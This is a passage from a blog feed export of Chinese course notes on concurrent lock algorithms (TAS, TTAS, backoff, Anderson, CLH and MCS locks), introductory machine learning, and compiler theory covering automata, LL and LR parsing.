<p><img src="/2021/11/18/并发算法与理论笔记/image-20211103093405629.png" alt="image-20211103093405629"></p>
<p>-</p>
<p>总结下</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211103093437356.png" alt="image-20211103093437356"></p>
<p>-</p>
<h2 id="lock-free-vs-wait-free"><a href="#lock-free-vs-wait-free" class="headerlink" title="lock-free vs wait-free"></a>lock-free vs wait-free</h2><p>wait-free的实现一定是lock-free的</p>
<p>就像lockout-free（就是starvation free）一定是deadlock-free一样</p>
<p>-</p>
<p>consensus是很有用的</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211103094352811.png" alt="image-20211103094352811"></p>
<h2 id="07-ppt"><a href="#07-ppt" class="headerlink" title="07 ppt"></a>07 ppt</h2><p>处理MIMD的问题</p>
<h1 id="class-11-Spin-Lock"><a href="#class-11-Spin-Lock" class="headerlink" title="class-11 Spin Lock"></a>class-11 Spin Lock</h1><h2 id="spin-lock的定义"><a href="#spin-lock的定义" class="headerlink" title="spin lock的定义"></a>spin lock的定义</h2><p><img src="/2021/11/18/并发算法与理论笔记/image-20211110080435467.png" alt="image-20211110080435467"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">spin_lock() &#123;</span><br><span class="line">	look() &#123;</span><br><span class="line">		while(...)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>-</p>
<h2 id="Test-and-Set"><a href="#Test-and-Set" class="headerlink" title="Test and Set"></a>Test and Set</h2><p><code>bool test_and_set(bool new)</code> </p>
<p>只用一个共享变量（一个Read-modify-write register）</p>
<p>操作：取出旧值，设置新值，返回旧值</p>
<p>锁free：旧值是false</p>
<p>锁taken：旧值是true</p>
<p>开锁：重置锁为false</p>
<p>-</p>
<p>根据之前课上的定理，似乎需要n个register才能搞定n个线程的锁，但这里我们用1个register就搞定了，为什么？</p>
<blockquote>
<p>因为这里的register是Read-modify-write register，consensus number=2，之前说的是read-write register，consensus number=1</p>
</blockquote>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211110081548266.png" alt="image-20211110081548266"></p>
<p>-</p>
<p>TAS的理想表现：线程数-花费时间，当线程数增加时花费时间不变</p>
<p>但实际上增长非常快，为什么？</p>
<p>先看TAS的变体：test-and-test-and-set</p>
<h2 id="Test-and-Test-and-Set"><a href="#Test-and-Test-and-Set" class="headerlink" title="Test and Test and Set"></a>Test and Test and Set</h2><p>在tas之前增加一个test，在test看到false（锁free）的时候去跑TAS</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lock() &#123;</span><br><span class="line">	while (true) &#123;</span><br><span class="line">		while (test()) ;</span><br><span class="line">		if (!test_and_set()) &#123;</span><br><span class="line">			return;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>TTAS的表现：</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211110083227359.png" alt="image-20211110083227359"></p>
<p>看上去有点奇怪，TTAS明明做了更多的操作，为啥还快呢？</p>
<blockquote>
<p>因为每个线程有自己的cache，如果只读cache的话，代价比set memory低很多</p>
</blockquote>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211110083904905.png" alt="image-20211110083904905"></p>
<p>-</p>
<p>TAS上锁：当一个线程set共享变量的时候，他会invalidate其他线程的cache，和memory，这样其他线程下次read的时候就发生cache miss，得重新通过bus去memory里取</p>
<p>TAS开锁：又要set了，要通过bus。但可能其他线程之前因为cache miss还在使用bus，所以开锁线程也要等待bus使用完毕</p>
<p>-</p>
<p>TTAS上锁：test阶段只从cache里读，如果锁没被改的话，就不需要走bus，也不会invalidate其他线程的cache</p>
<p>TTAS开锁：比TAS有更严重的问题，开锁后，其他线程全miss，重新load memory，然后看到false，那就准备进入TAS，假设其他线程都卡在进入TAS之前的地方。第一个执行TAS的成功拿到锁，再invalidate其他线程，第二个执行TAS的线程再次invalidate其他线程，进入新循环，第三个同第二个，。。。</p>
<blockquote>
<p>出现开锁问题的原因是，如果一轮尝试TTAS失败后（看到的false是假的），立刻进行下一轮尝试。如果尝试失败后，休息一会再来试试呢</p>
</blockquote>
<h2 id="Backoff"><a href="#Backoff" class="headerlink" title="Backoff"></a>Backoff</h2><p>在TTAS的基础上，引入一个随机等待时间</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211110092003744.png" alt="image-20211110092003744"></p>
<p>效果比TTAS好</p>
<h2 id="Anderson-Queue-Lock"><a href="#Anderson-Queue-Lock" class="headerlink" title="Anderson Queue Lock"></a>Anderson Queue Lock</h2><p>给线程排个队，每个线程处于数组中的一个slot，第一个slot开锁后把锁交给第二个slot（设置第二个slot为true）</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211110092810209.png" alt="image-20211110092810209"></p>
<p>-</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211110093040088.png" alt="image-20211110093040088"></p>
<p>-</p>
<p>表现很好，FIFO，starvation free</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211110093205996.png" alt="image-20211110093205996"></p>
<p>-</p>
<p>不好的地方</p>
<ul>
<li>需要长度n的数组</li>
<li>如果不知道线程个数呢，该设置多大呢</li>
<li>如果设置很大了，但只有很少线程在工作呢</li>
</ul>
<p>-</p>
<p>改成linked list就行了</p>
<p>-</p>
<p>Anderson Queue Lock符合如下的格式，lineariable point在L=true;</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bool L = false;</span><br><span class="line"></span><br><span class="line">lock() &#123;</span><br><span class="line">	while (L);</span><br><span class="line">	L = true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unlock() &#123;</span><br><span class="line">	L = false;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="CLH-Lock"><a href="#CLH-Lock" class="headerlink" title="CLH Lock"></a>CLH Lock</h2><p>把anderson的array改成linked list</p>
<p>但不是显式的linked list，注意到我们在上面的anderson里，数组里只用到next，保持next的增长和开锁后通知下一个slot即可，所以可能不需要显式的指针指向下一个。维护好链表的tail就好了</p>
<p>-</p>
<p>所有线程共享一个tail，初值为QNode(false)</p>
<p>每个线程维护2个指针，一个是自己的QNode my，一个是前驱的QNode pred。</p>
<blockquote>
<p>为什么要用QNode指针而不是直接boolean值？因为这样可以把更新传递给前驱</p>
</blockquote>
<p>上锁：设置my指向的对象为true，tail指向my指向的对象，pred指向tail，my和tail的指向交换的结果存在pred里，然后等待pred里的对象变成false（tail的初始false，或者被别的线程的my开锁变为false）。</p>
<p>开锁：my设置false（实际也变更了tail指向的对象，这就是真的开锁），my指向pred（之前的tail，反正肯定是false，但，是什么无所谓，只是之后复用空间才用得到，毕竟lock时候会直接设置my为true）</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211110104218455.png" alt="image-20211110104218455"></p>
<p>-</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211110104257195.png" alt="image-20211110104257195"></p>
<p>-</p>
<p>空间只要L+N，为啥呢，在有多个锁的情况下，他想重用QNode，主要是my指向的QNode</p>
<p>但我感觉就考虑下一个锁就行了，一个线程里有多个锁的，那不还得顺序执行吗，那同一时间只有一个锁生效，这个L个锁是真没啥必要讨论？</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211110103410900.png" alt="image-20211110103410900"></p>
<p>-</p>
<p>CLH Lock的好处</p>
<ul>
<li>mutual exclusion</li>
<li>starvation free</li>
<li><strong>first come first served</strong></li>
<li>lineariable</li>
<li>空间使用率高</li>
<li>不需要事先确定线程数n</li>
</ul>
<p>不好的地方</p>
<ul>
<li>在没cache的架构下（NUMA：non-uniform-memory-architecture）表现不好（有线程cache的情况，pred指向的节点，是线程的local memory，那么spin就很快。没cache的情况下，pred指向的节点，是其他处理器的remote memory，spin会很慢）</li>
</ul>
<p>-</p>
<p>如何改进cacheless架构下的表现？看MCS Lock</p>
<h1 id="class-12"><a href="#class-12" class="headerlink" title="class-12"></a>class-12</h1><h2 id="MCS-Lock"><a href="#MCS-Lock" class="headerlink" title="MCS Lock"></a>MCS Lock</h2><p>CLH是pred连接前驱的链表，MCS要做的是next连接后继的链表？</p>
<p>CLH是等着pred的节点开锁时更新，然后这个更新通过bus传递到后继的local cache，然后后继得以拿到锁。后继节点的spin完全依赖于前驱节点</p>
<p>MCS是开锁时通知后继节点，后继节点的spin只在local cache上spin，不会那么依赖前驱节点，所以在NUMS架构下也会表现好。</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211117092017654.png" alt="image-20211117092017654"></p>
<p>-</p>
<p>拿锁：</p>
<p>注意qnode definition的位置，是在lock的内部，纯纯local memory</p>
<p>如果tail=null，说明现在无线程，直接进入临界区</p>
<p>如果tail有指向，那就把自己链入链表，然后等pred开锁</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211117092033645.png" alt="image-20211117092033645"></p>
<p>-</p>
<p>开锁：qnode.next=null时，并不代表真的没有后继节点，可能是后继节点还没来得及链入链表（未执行pred.next = qnode），所以需要判定一下</p>
<p>CAS是什么？compare and swap，如果tail == qnode，那tail = null，return true，否则啥也不做并return falsee。这个指令比较消耗时间，所以放在内层的if里。</p>
<p>判断是不是真的没有后继节点（如果有后继set了tail但未链入qnode.next，tail是会被改变成其他线程的qnode的）</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211117092116587.png" alt="image-20211117092116587"></p>
<p>-</p>
<h2 id="Abortable-Locks"><a href="#Abortable-Locks" class="headerlink" title="Abortable Locks"></a>Abortable Locks</h2><p>如果有一个线程等着等着不想等了，退出了，怎么办？</p>
<h3 id="TAS，TTAS，Backoff-Lock"><a href="#TAS，TTAS，Backoff-Lock" class="headerlink" title="TAS，TTAS，Backoff Lock"></a>TAS，TTAS，Backoff Lock</h3><p>都没问题，因为他们的lock函数return时，完全不影响其他线程</p>
<h3 id="CLH-Lock-gt-Time-out-Lock"><a href="#CLH-Lock-gt-Time-out-Lock" class="headerlink" title="CLH Lock -&gt; Time-out Lock"></a>CLH Lock -&gt; Time-out Lock</h3><p>放弃的节点不能直接quit，因为lock state需要沿着链传递，直接quit的话后继节点就会饿死</p>
<p>改一下mcs lock，叫time-out lock</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211117094805279.png" alt="image-20211117094805279"></p>
<p>-</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211117094907054.png" alt="image-20211117094907054" style="zoom:80%;"></p>
<p>-</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20211117111558865.png" alt="image-20211117111558865"></p>
]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Concurrency</tag>
      </tags>
  </entry>
  <entry>
    <title>机器学习笔记</title>
    <url>/2019/02/27/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>机器学习复习笔记</p>
<p>参考书目：西瓜书</p>
<h1 id="第一章-绪论"><a href="#第一章-绪论" class="headerlink" title="第一章 绪论"></a>第一章 绪论</h1><h2 id="课程任务"><a href="#课程任务" class="headerlink" title="课程任务"></a>课程任务</h2><ol>
<li>平时作业40%</li>
<li>期中30%</li>
<li>期末30%（投票决定闭卷/半开卷）</li>
</ol>
<p>平时作业有2次取较高分作为期中成绩，其他4次作为平时成绩<br>半开卷：允许带一张a4纸，上面写什么都可以，考完交a4纸</p>
<h2 id="机器学习示例："><a href="#机器学习示例：" class="headerlink" title="机器学习示例："></a>机器学习示例：</h2><p>文献筛选<br>在<code>循证医学</code>中，针对特定临床问题，要先查文献进行详细研究评估。<br>提取摘要-&gt;人工筛选。应用机器学习后专家读少量文献，标记有关/无关，模型去读剩下来的文献。</p>
<p>搜索引擎<br><code>用机器学习解决排序问题</code></p>
<p>战场战术层面<br><code>损害管制自主机器人</code><br><code>罗盘系统</code></p>
<h2 id="典型的机器学习过程："><a href="#典型的机器学习过程：" class="headerlink" title="典型的机器学习过程："></a>典型的机器学习过程：</h2><p>给模型以数据（包含一系列属性+1个label），训练，检测。</p>
<h2 id="几个分类："><a href="#几个分类：" class="headerlink" title="几个分类："></a>几个分类：</h2><p><code>符号主义学习</code>、<code>连接主义学习</code></p>
<p>贝叶斯学派：<br>第1天，太阳升起，建立模型，预测明天太阳升起概率1/2<br>第2天，太阳升起，修正参数，预测明天太阳升起概率1/3<br>…<br>第30000天，预测30000/300001</p>
<p>非贝叶斯学派：<br>第1天，太阳升起，预测1<br>第2天，太阳升起，预测1<br>…<br>第30000天，根据之前的事实证据，认为太阳升起概率恒为1</p>
<h2 id="面临问题"><a href="#面临问题" class="headerlink" title="面临问题"></a>面临问题</h2><p>现在的问题在于大厂缺少需求，算力过剩。Google收购DeepMind是为了消耗TPU，AI实际上是互联网商们的一个出口。</p>
<p>鲁棒性不行，人类棋手犯错，从九段跌到八段，机器犯错，从九段跌到业余。</p>
<h1 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a>第二章</h1><h2 id="基本术语"><a href="#基本术语" class="headerlink" title="基本术语"></a>基本术语</h2><h3 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h3><p>预测目标：</p>
<ul>
<li>分类：最后的输出是离散值<ul>
<li>二分类：好瓜、坏瓜</li>
<li>多分类：冬瓜、南瓜、西瓜</li>
</ul>
</li>
<li>回归：连续值<ul>
<li>瓜的成熟度</li>
</ul>
</li>
<li>聚类：无标记信息（物以类聚/具有相同hash feature的数据被hash后放入同一个桶/韩信点兵/等价类划分）</li>
</ul>
<p>有无标记信息：</p>
<ul>
<li>监督学习：分类、回归</li>
<li>无监督学习：聚类</li>
<li>半监督学习：两者结合</li>
</ul>
]]></content>
      <categories>
        <category>Machine Learning</category>
      </categories>
      <tags>
        <tag>Machine Learning</tag>
      </tags>
  </entry>
  <entry>
    <title>编译原理复习笔记</title>
    <url>/2020/08/13/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>编译原理复习笔记</p>
<hr>
<h1 id="ch1-概论"><a href="#ch1-概论" class="headerlink" title="ch1 概论"></a>ch1 概论</h1><h2 id="需要掌握的问题"><a href="#需要掌握的问题" class="headerlink" title="需要掌握的问题"></a>需要掌握的问题</h2><ol>
<li>编译器编译程序的顺序</li>
<li>环境与状态是什么</li>
<li>编译和翻译的区别？代表是？</li>
</ol>
<h2 id="回答"><a href="#回答" class="headerlink" title="回答"></a>回答</h2><h3 id="1-编译器编译程序的顺序"><a href="#1-编译器编译程序的顺序" class="headerlink" title="1. 编译器编译程序的顺序"></a>1. 编译器编译程序的顺序</h3><p>字符流=&gt;|词法分析|=&gt;符号流=&gt;|语法分析|=&gt;语法树=&gt;|语义分析|=&gt;语法树=&gt;</p>
<p>|中间代码翻译|=&gt;中间代码=&gt;|中间代码优化|=&gt;|机器代码生成|=&gt;|机器代码优化|</p>
<h3 id="2-环境与状态是什么"><a href="#2-环境与状态是什么" class="headerlink" title="2. 环境与状态是什么"></a>2. 环境与状态是什么</h3><p>环境：变量名到存储位置的映射</p>
<p>状态：存储位置和值的映射</p>
<h3 id="3-编译和翻译的区别？代表是？"><a href="#3-编译和翻译的区别？代表是？" class="headerlink" title="3. 编译和翻译的区别？代表是？"></a>3. 编译和翻译的区别？代表是？</h3><p>编译：把源程序转换成可执行程序，代表C/C++</p>
<p>翻译：不生成可执行程序，直接根据语义执行，代表python</p>
<blockquote>
<p>java是编译和翻译的结合</p>
</blockquote>
<h1 id="ch3-词法分析"><a href="#ch3-词法分析" class="headerlink" title="ch3 词法分析"></a>ch3 词法分析</h1><h2 id="需要掌握的问题-1"><a href="#需要掌握的问题-1" class="headerlink" title="需要掌握的问题"></a>需要掌握的问题</h2><ol>
<li>词法单元、模式、词素的概念</li>
<li>字母表、串、语言的概念</li>
<li>语言4个运算：并、连接、kleene闭包、正闭包</li>
<li>正则表达式的4个运算：选择、连接、闭包、括号；扩展运算+ ？ []</li>
<li>NFA 、DFA的定义</li>
<li>正则到NFA的转换</li>
<li>NFA到DFA的转换</li>
<li>NFA的合并</li>
<li>状态的区分、DFA状态数量最小化</li>
<li>词法分析器的状态最小化</li>
<li>下推自动机和有穷自动机</li>
</ol>
<h2 id="回答-1"><a href="#回答-1" class="headerlink" title="回答"></a>回答</h2><h3 id="6-正则到NFA的转换"><a href="#6-正则到NFA的转换" class="headerlink" title="6. 正则到NFA的转换"></a>6. 正则到NFA的转换</h3><p>根据规则递归构造</p>
<p>基本：</p>
<p>start—&gt;i—eps—&gt;(f)</p>
<p>start—&gt;i—a—&gt;(f)</p>
<p>归纳：</p>
<ul>
<li>选择 s | t：开两路，都eps</li>
</ul>
<p><img src="/2020/08/13/编译原理复习笔记/image-20200816070830145.png" alt="image-20200816070830145"></p>
<ul>
<li>连接 s | t：</li>
</ul>
<p>s的结尾f，拼t的开头i</p>
<p><img src="/2020/08/13/编译原理复习笔记/image-20200816070812251.png" alt="image-20200816070812251"></p>
<ul>
<li>闭包 s*</li>
</ul>
<p>s的结尾f出一条eps边指向开头i，再新增i和f</p>
<p><img src="/2020/08/13/编译原理复习笔记/image-20200816070939663.png" alt="image-20200816070939663"></p>
<h3 id="7-NFA到DFA的转换"><a href="#7-NFA到DFA的转换" class="headerlink" title="7. NFA到DFA的转换"></a>7. NFA到DFA的转换</h3><p>子集构造法：</p>
<p>eps-closure(s)：从s经一次或多次eps可到达的状态集合</p>
<p>eps-closure(T)：从T集合中的状态经一次或多次eps可到达的状态集合</p>
<p>move(T, a)：对于输入a，从T集合中的状态经一次a可到达的状态集合</p>
<p>算法：</p>
<ol>
<li>初始集合A = eps-closure(s0)，s0是NFA的开始状态</li>
<li>计算 B = eps-closure(Move(A, a))，a是一个输入符号，得到 Dtran(A, a) = B</li>
<li>计算 C = eps-closure(Move(B, a))，得到 Dtran(B, a) = C</li>
<li>….</li>
<li>直到计算不出新的状态集合，就算结束，根据 Dtran 表画出新的DFA，开始状态是NFA中包含s0的状态集合，接收状态是NFA中包含接受状态的状态集合</li>
</ol>
<h3 id="8-NFA的合并"><a href="#8-NFA的合并" class="headerlink" title="8. NFA的合并"></a>8. NFA的合并</h3><p>NFA合并，就是新增一个开头i，然后出若干条eps边指向每个NFA的i</p>
<h3 id="9-状态的区分、DFA状态数量最小化"><a href="#9-状态的区分、DFA状态数量最小化" class="headerlink" title="9. 状态的区分、DFA状态数量最小化"></a>9. 状态的区分、DFA状态数量最小化</h3><p>区分：DFA中的两个状态s1和s2，如果s1能通过一个输入符号a到达接收状态，而s2不能，那么就说a区分了s1和s2</p>
<p>DFA状态数量最小化：</p>
<ol>
<li>eps区分了接受状态集合和非接收状态集合（1+1）</li>
<li>再细分</li>
<li>最后不可区分的状态集合合并为新状态</li>
</ol>
<h3 id="10-词法分析器的状态最小化"><a href="#10-词法分析器的状态最小化" class="headerlink" title="10. 词法分析器的状态最小化"></a>10. 词法分析器的状态最小化</h3><p>和DFA类似，区别只在于，每个模式的接收状态是不一样的，所以初始划分为：所有模式的非接受状态集合+各个模式接收状态集合（1+x）</p>
<h1 id="ch4-语法分析"><a href="#ch4-语法分析" class="headerlink" title="ch4 语法分析"></a>ch4 语法分析</h1><h2 id="需要掌握的问题-2"><a href="#需要掌握的问题-2" class="headerlink" title="需要掌握的问题"></a>需要掌握的问题</h2><ol>
<li>上下文无关文法（CFG）</li>
<li>BNF是啥</li>
<li>自顶向下、自底向上语法分析器、LL，LR的概念和关系</li>
<li>推导、推导序列、最左推导、最右推导、句型、句柄、句子</li>
<li>正则表达式有穷自动机的缺陷，NFA到上下文无关文法的转换</li>
<li>消除二义性if-else例子</li>
<li>消除左递归</li>
<li>预测分析法、提取左公因子</li>
<li>递归下降分析+回溯</li>
<li>FIRST集和FOLLOW集的计算</li>
</ol>
<h2 id="回答-2"><a href="#回答-2" class="headerlink" title="回答"></a>回答</h2><h3 id="3-自顶向下语法分析"><a href="#3-自顶向下语法分析" class="headerlink" title="3. 自顶向下语法分析"></a>3. 自顶向下语法分析</h3><p>自顶向下：从根节点创建，对应最左推导，每次把最左边的非终结符找到产生式</p>
<h3 id="6-消除二义性if-else例子"><a href="#6-消除二义性if-else例子" class="headerlink" title="6. 消除二义性if-else例子"></a>6. 消除二义性if-else例子</h3><p>有二义性的if-else</p>
<p>stmt -&gt; if expr then stmt </p>
<p>| if expr then stmt else stmt</p>
<p>| other</p>
<p>消除二义性</p>
<p>stmt -&gt; matched_stmt | open_stmt</p>
<p>matched_stmt -&gt; if expr then matched_stmt else matched_stmt</p>
<p>| other</p>
<p>open_stmt -&gt; if expr then stmt</p>
<p>| if expr then matched_stmt else open_stmt</p>
<h3 id="7-消除左递归"><a href="#7-消除左递归" class="headerlink" title="7. 消除左递归"></a>7. 消除左递归</h3><p>自顶向下的语法分析技术无法处理左递归，需要消除</p>
<p>自底向上的语法分析技术可以处理左递归</p>
<p>左递归形式 $A =&gt;^{+} Aa$</p>
<p>立即左递归消除：</p>
<p>$A \rightarrow Aa_1 | A a_2 | …| A a_m | b_1 | b_2 |…|b_n$</p>
<p>观察到匹配的句子是 b a*格式</p>
<p>那么改写为</p>
<p>$A \rightarrow b_1 A’| b_2A’|…|b_n A’$</p>
<p>$A’ \rightarrow a_1A’|a_2A’|…|a_mA’|\epsilon$</p>
<p>注意最后的eps</p>
<p>通用消除左递归：给非终结符排个序，后面的符号中的前面符号全部展开，然后消除立即左递归</p>
<p>弊端：难以找到原文法和消除后文法的关联，语义分析困难</p>
<h3 id="8-预测分析法、提取左公因子"><a href="#8-预测分析法、提取左公因子" class="headerlink" title="8. 预测分析法、提取左公因子"></a>8. 预测分析法、提取左公因子</h3><p>预测分析法：通过查看下一个输入符号，给最左边的非终结符选择一个产生式</p>
<blockquote>
<p>在遇到相同前缀产生式时无能为力，所以需要提取左公因子</p>
</blockquote>
<p>$A \rightarrow aA_1|aA_2|…|\gamma$</p>
<p>提取后</p>
<p>$A \rightarrow a B| \gamma$</p>
<p>$B \rightarrow A_1|A_2|…$</p>
<h3 id="10-FIRST集和FOLLOW集的计算"><a href="#10-FIRST集和FOLLOW集的计算" class="headerlink" title="10. FIRST集和FOLLOW集的计算"></a>10. FIRST集和FOLLOW集的计算</h3><p>FIRST(X)：</p>
<ol>
<li>X是终结符，加入X</li>
<li>X是非终结符，且X-&gt;A1A2…An，加入FIRST(A1)，如果含有eps，再加入FIRST(A2)，如果再含有eps，继续加</li>
<li>如果FIRST(Ai)全有eps，再加eps</li>
</ol>
<p>FIRST(X1X2Xn)：</p>
<ol>
<li>加FIRST(X1)</li>
<li>如果FIRST(X1)中含eps，加FIRST(X2)，…</li>
<li>如果FIRST(Xi)全有eps，再加eps</li>
</ol>
<p>FOLLOW(X)：</p>
<ol>
<li>如有产生式 $A \rightarrow aB\beta$，把FOLLOW($\beta$)加入FOLLOW(B)</li>
<li>如有产生式 $A \rightarrow aB$，把FOLLOW(A)加入FOLLOW(B)</li>
<li>如有产生式 $A \rightarrow aB\beta$，且FIRST($\beta$)中包含eps，把FOLLOW(A)加入FOLLOW(B)</li>
</ol>
<p>要算FOLLOW集合是整体算</p>
<ol>
<li>把开始状态的FOLLOW集，FOLLOW(S)中添加右端终止符$</li>
<li>迭代计算所有非终结符的FOLLOW，直到不再变化</li>
</ol>
<h3 id="11-LL-1-文法定义"><a href="#11-LL-1-文法定义" class="headerlink" title="11. LL(1)文法定义"></a>11. LL(1)文法定义</h3><p>对于任意两个产生式 A-&gt;a | b</p>
<ol>
<li>FOLLOW(a) ∩ FOLLOW(b) = 空集</li>
<li>若B可推导出eps，那么FOLLOW(A) 与 FISRT(a) 无交集</li>
</ol>
<h3 id="12-预测分析表的构造，预测分析算法"><a href="#12-预测分析表的构造，预测分析算法" class="headerlink" title="12. 预测分析表的构造，预测分析算法"></a>12. 预测分析表的构造，预测分析算法</h3><p>输入：文法G，输出：预测分析表M</p>
<p>对于G中的每个产生式A-&gt;a</p>
<ol>
<li>对FIRST(a)中的每一个终结符x，M[A，x] 添加 A-&gt;a</li>
<li>如果FIRST(a)中含有eps，那对于FOLLOW(A)中的每一个终结符x，M[A, x] 添加 A-&gt;a</li>
<li>在所有空白条目中填error</li>
</ol>
<blockquote>
<p>如果预测分析表冲突了，那么说明这个文法是有二义性的，不是LL(1)的，LL(1)不可能存在二义性</p>
</blockquote>
<p>预测分析算法：</p>
<ol>
<li>栈中初始为s$，栈顶符号为top，输入区初始为输入串w，指针ip指向符号a，已有预测表M[A, a]</li>
<li>如果top是终结符且top = a，出栈，ip前移</li>
<li>如果top是非终结符，选择M[top, a]里的右侧式子替换top</li>
<li>其他均error</li>
<li>等匹配完$栈空的时候就完事了</li>
</ol>
<blockquote>
<p>已匹配的部分+栈里的东西 = 一个最左句型</p>
</blockquote>
<h3 id="13-自底向上语法分析、移入-归约算法、冲突"><a href="#13-自底向上语法分析、移入-归约算法、冲突" class="headerlink" title="13. 自底向上语法分析、移入-归约算法、冲突"></a>13. 自底向上语法分析、移入-归约算法、冲突</h3><p>最右句型：AAAAaaa形式，左边全是非终结符，右边全是终结符</p>
<p>句柄：S =&gt;* aAw =&gt; abw，则说A-&gt;b是一个句柄</p>
<blockquote>
<p>在最右句型中，一个句柄的右边只有终结符</p>
</blockquote>
<p>例如：</p>
<p>id1*id2，选用F-&gt;id归约，则id1是句柄</p>
<p>F*id2，选用T-&gt;F归约，则F是句柄</p>
<p>T*id2，选用F-&gt;id归约，则id2是句柄</p>
<p>T<em>F，选用E-&gt;T </em>F归约，则T * F是句柄</p>
<p>E</p>
<p>移入：从输入缓冲区里选择符号移入栈</p>
<p>归约：把栈顶的若干符号归约成产生式左边的非终结符</p>
<p>完成：最后归约成初始符号S</p>
<p>移入-归约冲突：不知道是否该移入</p>
<p>归约-归约冲突：不知道该选择哪个产生式进行归约</p>
<p>总结来说，搞一个LR语法分析，文法G，增广为G’，求G‘的项集规范族，然后求FOLLOW(A), GOTO(Ii, A), 自动机，然后求SLR语法分析表，然后用算法去算。</p>
<h3 id="14-SLR、LR"><a href="#14-SLR、LR" class="headerlink" title="14. SLR、LR"></a>14. SLR、LR</h3><p>LR(k)的含义：L是最左扫描，R是反向构造最右推导，k是最多往前看k个符号，通常k&lt;=1有意义</p>
<p>LR(k)比LL(k)能分析的文法更多、由表格驱动</p>
<h3 id="15-项集、增广文法、项集闭包、GOTO函数"><a href="#15-项集、增广文法、项集闭包、GOTO函数" class="headerlink" title="15. 项集、增广文法、项集闭包、GOTO函数"></a>15. 项集、增广文法、项集闭包、GOTO函数</h3><p>项集：产生式+产生式右边某处放一个点</p>
<p>增广文法：新增S’ -&gt; S产生式</p>
<p>项集闭包CLOSURE(I)：</p>
<ol>
<li>I本身</li>
<li>比如S-&gt;A·Br的闭包，就包含把B的产生式B-&gt;·b添加进去，然后迭代算</li>
</ol>
<p>GOTO(I, X) ：I是项集，X是终结符或非终结符，把I中所有的 S-&gt;A·XB 都换成 S-&gt;AX·B，然后求项集闭包</p>
<p>LR(0)自动机</p>
<p><img src="/2020/08/13/编译原理复习笔记/image-20200816171853870.png" alt="image-20200816171853870"></p>
<p>。</p>
<p><img src="/2020/08/13/编译原理复习笔记/image-20200816171832685.png" alt="image-20200816171832685"></p>
<p>。</p>
<p>LR(0)自动机有ACTION和GOTO两个功能</p>
<p>归约过程：栈里存的是项集（也称状态），设栈顶状态s，有一个输入缓冲区，当前输入为a</p>
<ul>
<li><p>栈中初始状态为 S’-&gt;S 的闭包对应项集编号</p>
</li>
<li><p>每次看ACTION(s, a)</p>
<ul>
<li>如果是移入，就移入栈</li>
<li>如果是归约，那就归约栈顶的若干符号为一个符号，然后用把露出来的栈顶i，push上 GOTO(i, a)为新的栈顶</li>
<li>如果是接受，那就结束</li>
</ul>
</li>
</ul>
<p><img src="/2020/08/13/编译原理复习笔记/image-20200816172533517.png" alt="image-20200816172533517"></p>
<h3 id="16-SLR分析表的构造，如何得到ACTION和GOTO表"><a href="#16-SLR分析表的构造，如何得到ACTION和GOTO表" class="headerlink" title="16. SLR分析表的构造，如何得到ACTION和GOTO表"></a>16. SLR分析表的构造，如何得到ACTION和GOTO表</h3><ol>
<li>状态i中，如果有 S-&gt; A·aB，且$GOTO(I_i, a) = I_j$，则 ACTION(i, a) = 移入j</li>
<li>状态i中，如果有 S-&gt; a· ，那么对于FOLLOW(S)中的所有x，ACTION(i, x) = 按S-&gt;a归约</li>
<li>状态i中，如果有 S’ -&gt; S，ACTION(i, $) = 接受</li>
<li>$GOTO(I_i, a) = I_j$，那么GOTO表里的 GOTO(i, a) = j</li>
</ol>
<p>如果分析表不冲突，那么该文法就是SLR的，可能考一个判断是否为SLR文法？</p>
<h3 id="17-规范LR方法（LR-1-项集）、向前看LR方法（LALR方法）"><a href="#17-规范LR方法（LR-1-项集）、向前看LR方法（LALR方法）" class="headerlink" title="17. 规范LR方法（LR(1)项集）、向前看LR方法（LALR方法）"></a>17. 规范LR方法（LR(1)项集）、向前看LR方法（LALR方法）</h3><p>LR(1)项集格式 [A-&gt;a·b, x] 含义是如果将来要按 A-&gt;ab归约，那么下一个符号必须是x</p>
